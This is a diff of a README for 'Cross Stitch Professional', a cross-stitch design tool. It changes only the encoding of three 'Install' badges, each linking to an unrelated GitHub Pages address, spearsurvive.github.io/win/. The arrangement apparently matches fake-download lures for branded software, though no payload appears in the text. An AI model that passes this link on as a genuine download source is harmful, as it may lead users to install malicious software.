@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Cross Stitch Professional](https://img.shields.io/badge/⬇_Install_Cross%20Stitch%20Professional-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Cross Stitch Professional](https://img.shields.io/badge/⬇_Install_Cross+Stitch+Professional-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Cross Stitch Professional is a dedicated design tool for creating and editing cr
 
 <div align="center">
 
-[![⬇ Install Cross Stitch Professional](https://img.shields.io/badge/⬇_Install_Cross%20Stitch%20Professional-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Cross Stitch Professional](https://img.shields.io/badge/⬇_Install_Cross+Stitch+Professional-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Cross Stitch Professional is a dedicated design tool for creating and editing cr
 
 <div align="center">
 
-[![⬇ Install Cross Stitch Professional](https://img.shields.io/badge/⬇_Install_Cross%20Stitch%20Professional-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Cross Stitch Professional](https://img.shields.io/badge/⬇_Install_Cross+Stitch+Professional-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
